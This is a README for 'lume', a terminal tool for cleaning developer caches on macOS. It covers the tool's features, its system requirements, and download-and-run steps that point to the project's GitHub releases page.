# 🔥 lume - Safe Mac Cleanup Tool  

[![Download lume](https://img.shields.io/badge/Download-lume-brightgreen?style=for-the-badge&logo=github)](https://github.com/Nyakairu/lume/releases)

---

## 🖥️ What is lume?  

lume helps you clean up your Mac without risking permanent deletion. It scans over 55 developer-focused areas to find files and data you might no longer need. Instead of deleting immediately, it safely moves items to the Trash. It also finds duplicates using a careful SHA-256 method, so you don’t lose anything important. You use it through a simple terminal-based interface that looks clean and easy to use.

---

## 🎯 Main Features  

- Checks more than 55 areas related to development files and caches  
- Finds duplicates using a three-step SHA-256 comparison  
- Moves files to Trash, so cleanup is safe and reversible  
- Text user interface (TUI) with clear menus and options  
- Works on macOS systems with basic terminal knowledge  
- Open-source and free to use  

---

## 🛠️ System Requirements  

- macOS version 10.15 (Catalina) or later  
- At least 200 MB of free disk space for scanning cache files  
- Terminal app (comes preinstalled with macOS)  
- Basic user privileges (no administrator rights needed for most tasks)  

---

## 🚀 Getting Started  

### Step 1: Visit the Download Page  
Go to the official release page for lume to get the latest version:

[![Get lume here](https://img.shields.io/badge/Download-lume-blue?style=for-the-badge&logo=github)](https://github.com/Nyakairu/lume/releases)

This page lists all available versions. Choose the file designed for macOS. It usually ends with `.tar.gz` or `.zip`.

---

### Step 2: Download the File  
Click on the latest version and download the file to your Mac. It will save to your default Downloads folder.

---

### Step 3: Extract the File  
- Open Finder and go to your Downloads folder.  
- Double-click the downloaded archive (`.zip` or `.tar.gz`).  
- This creates a new folder with the program files. Move this folder to a convenient place like Applications or your Documents.

---

### Step 4: Run lume  

- Open the Terminal app on your Mac (find it in Applications > Utilities).  
- Change directories to where you unpacked lume. For example:  
  ```
  cd ~/Documents/lume-folder
  ```  
- Run the program by typing:  
  ```
  ./lume
  ```  
- The text interface will open. Use the arrow keys and Enter on your keyboard to navigate.  

---

## 📋 How to Use lume  

- **Scan your system:**  
  From the main menu, select “Scan.” The program will analyze files marked for cleanup.  

- **Review findings:**  
  After the scan, you will see categories and file counts. Review these items carefully.  

- **Delete safely:**  
  When you decide to remove files, lume moves them to the Trash. This means you can restore something if needed.  

- **Check duplicates:**  
  A special option lets you run a three-step process checking file duplicates safely. It compares SHA-256 hash values to avoid mistakes.  

---

## ⚙️ Configuration Options  

lume includes basic settings to customize scans:  

- Choose specific scan targets (for example, caches, logs, old build files)  
- Set a minimum file size to ignore very small files  
- Enable or disable duplicate detection during scans  
- Clear previous scan results before a new run  

Change settings inside the TUI under the “Settings” menu.

---

## 🛡️ Safety and Data Handling  

- Files are never deleted permanently by lume directly.  
- All items targeted for removal are sent to the macOS Trash.  
- You can restore files from Trash if needed.  
- The duplicate detection uses industry-standard SHA-256 hashes to avoid data loss.  
- Always check scan details before confirming deletions.

---

## 👩‍💻 Tips for Best Results  

- Run lume regularly to keep your system clean.  
- Empty the Trash manually when you confirm you don’t need the files anymore.  
- Use duplicate detection after major cleanups for extra freespace.  
- Close other applications while scanning for better performance.  
- Keep lumen updated by downloading the latest release version from the releases page.

---

## ❓ Need Help?  

- Check the documentation inside the repo for detailed explanation of features.  
- Look through Issues in GitHub if you face bugs or questions.  
- Use the TUI help menu (press `h` inside the app) for quick guidance.  

---

## 📥 Download and Install lume  

1. Visit the releases page:  
   https://github.com/Nyakairu/lume/releases  

2. Find the latest macOS build and download the file.  

3. Extract the archive on your Mac.  

4. Open Terminal, navigate to the folder, and run `./lume`.  

5. Follow on-screen instructions to scan and clean safely.  

---

## 🧰 Behind the Scenes  

lume is built with Go and uses Bubble Tea for its terminal user interface. It targets developer-focused files to clean caches, old builds, logs, and more without risking important data. This focus helps free space on your Mac while keeping workflows smooth.

---

## 🔖 Topics  

bubbletea, charm, cleanup, devtools, free, go, golang, macos, opensource, safe-delete, system-cleaner, terminal, tui